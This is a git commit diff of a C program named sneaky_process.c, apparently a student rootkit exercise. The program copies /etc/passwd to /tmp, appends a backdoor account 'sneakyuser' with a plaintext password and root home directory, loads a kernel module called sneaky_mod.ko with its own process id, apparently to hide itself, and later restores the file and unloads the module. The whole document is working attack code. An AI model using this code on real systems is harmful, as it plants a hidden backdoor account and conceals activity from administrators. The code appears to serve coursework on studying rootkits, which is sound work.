5f6ba83a41b2d1bf9046a769aa016eeafd0fb443
leowindows7 <nthaninus@gmail.com>
2022-04-14 12:00:12 -0400

    new abstraction

--- sneaky_process.c
+++ sneaky_process.c
@@ -5,30 +5,35 @@
 
 void attack1_copy_password()
 {
-  system("cp /etc/passwd /tmp");
+  system("cp /etc/passwd /tmp/passwd");
   system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> "
          "/etc/passwd");
 }
 
-void attack2_load_sneaky(){
-  char cmd[50];
-  sprintf(cmd, "insmod sneaky_mod.ko pid=%d", (int)getpid());
-  system(cmd);
+void attack2_load_sneaky()
+{
+  char insmod[50];
+  sprintf(insmod, "insmod sneaky_mod.ko pid=%d", (int)getpid());
+  system(insmod);
 }
 
-
+void restore()
+{
+  system("rmmod sneaky_mod.ko");
+  system("cp /tmp/passwd /etc/passwd");
+  system("rm /tmp/passwd");
+}
 
 int main()
 {
   // print process id
   printf("sneaky_process pid = % d\n", getpid());
   attack1_copy_password();
-  // attack2
+  attack2_load_sneaky();
   char c;
-  while ((c = getchar()) != 'q') {
+  while ((c = getchar()) != 'q')
+  {
   }
-  //system("rmmod sneaky_mod");
-  system("cp /tmp/passwd /etc");
-  system("rm /tmp/passwd");
+  restore();
   return EXIT_SUCCESS;
 }
